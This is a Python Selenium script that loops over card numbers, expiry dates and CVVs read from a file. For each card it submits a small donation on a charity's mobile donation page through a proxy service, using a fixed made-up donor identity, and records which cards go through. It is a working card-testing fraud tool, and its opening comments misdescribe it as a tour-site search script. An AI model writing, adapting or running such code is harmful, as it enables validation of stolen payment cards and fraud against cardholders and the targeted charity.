# "InterPack Tour Site", Search Tour Location After Input -> Result.
# PC Login Trouble -> Mobile Login
# Take Module

from selenium import webdriver as wd
from bs4 import BeautifulSoup as bs
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

import time
import json
import datetime
import base64

# Website URL
main_url = 'https://m.america.cry.org/donate.html'

# Personal Info
f_name = 'Luke'
l_name = 'Millanta'
email = 'pa0293491@gmail.com'
phone_number = '0123123123'
comment = ''

# Payment Info
b_f_name = 'Luke'
b_l_name = 'Millanta'
country = 'US'
city = 'New York'
state = 'NY'
address = '12th Ave Street'
zip_code = '10080'

card_type = 'Visa Card'

CHROME_PATH = './chromedriver.exe'
# CHROME_PATH = 'E://chromedriver.exe'

# Proxy Setting

PROXY = "http://zproxy.lum-superproxy.io:22225@localhost:8080"

# Create a copy of desired capabilities object.
desired_capabilities = wd.DesiredCapabilities.CHROME.copy()
# Change the proxy properties of that copy.
desired_capabilities['proxy'] = {
    "httpProxy":PROXY,
    "ftpProxy":PROXY,
    "sslProxy":PROXY,
    "noProxy":None,
    "proxyType":"MANUAL",
    "class":"org.openqa.selenium.Proxy",
    "autodetect":False
}


# Proxy Setting

i = 1
ff = open("./cc.txt", "r")
with open('response.txt', 'a') as f:
    current_time = datetime.date.today().strftime("%I:%M %p on %B %d, %Y")
    f.write("%s\n\n" % current_time)
for line in ff:
    detail = line.split("|")
    card_number = detail[0]
    mm= detail[1].split("\n")[0]
    yyyy= detail[2]
    cvv= detail[3].split("\n")[0]

    driver = wd.Chrome(executable_path = CHROME_PATH, desired_capabilities=desired_capabilities)
    driver.get(main_url)
    print(str(i) + " Started!")
    try:
        element = WebDriverWait(driver, 60).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '#ui-accordion-1-header-0'))
        )
    except Exception as e:
        print('Error', e)


    driver.find_element_by_css_selector('#ui-accordion-1-header-0').click()
    time.sleep(0.1)

    driver.find_elements_by_xpath('//div[@id="dnow"]/div[@class="support-cause"]/div[@class="row"]/span[contains(@class,"custom-radio")]')[-1].click()
    time.sleep(0.5)
    driver.find_element_by_css_selector('#radio4').send_keys('2')
    time.sleep(0.1)

    # set person information
    driver.find_element_by_css_selector('#onename').send_keys('{} {}'.format(f_name, l_name))
    driver.find_element_by_css_selector('#oneemail').send_keys(email)
    driver.find_element_by_css_selector('#onephone').send_keys(phone_number)
    driver.find_element_by_css_selector('#onecity').send_keys(city)
    driver.find_element_by_css_selector('#onezipcode').send_keys(zip_code)
    driver.find_element_by_xpath('//select[@id="onestate"]/option[text()="{}"]'.format(city)).click()

    # Set Payment Detail
    driver.find_element_by_xpath('//select[@id="onecardtype"]/option[text()="{}"]'.format(card_type)).click()
    driver.find_element_by_css_selector('#onecardnumber').send_keys(card_number)
    driver.find_element_by_css_selector('#oneCcV').send_keys(cvv)

    # driver.find_element_by_xpath('//div[@class="select-form-control select-sel-02 select-ico-6 select-dropdown_img select-oneexpmon select-area"]/span[@class="center"]').click()
    driver.find_element_by_xpath('//select[@id="oneexpMonth"]/option[@value="{}"]'.format(mm)).click()
    driver.find_element_by_xpath('//select[@id="oneexpYear"]/option[text()="{}"]'.format(yyyy)).click()

    time.sleep(0.5)

    driver.find_element_by_xpath('//input[@value="Proceed to Payment"]').click()

    response = []
    response.append(line.split('\n')[0])

    try:
        element = WebDriverWait(driver, 60).until(
            EC.presence_of_element_located((By.XPATH, '//section[@class="thank-msg accept-msg"]'))
        )

        response.extend(driver.find_element_by_xpath('//section[@class="thank-msg error-msg" and @style="display: block;"]').text.split('\n'))
        # lists = driver.find_elements_by_css_selector("#errorExplanation ul li")
        # for li in lists:
        #     response.append(li.text)
    except Exception as e:
        response.append('Success!')

    with open('response.txt', 'a') as f:
        for item in response:
            f.write("( %s ), " % item)
        f.write("\n")
    driver.close()
    driver.quit()
    print(str(i) + " Finished!")
    i = i + 1

with open('response.txt', 'a') as f:
    f.write("\n\n")
import sys
sys.exit()



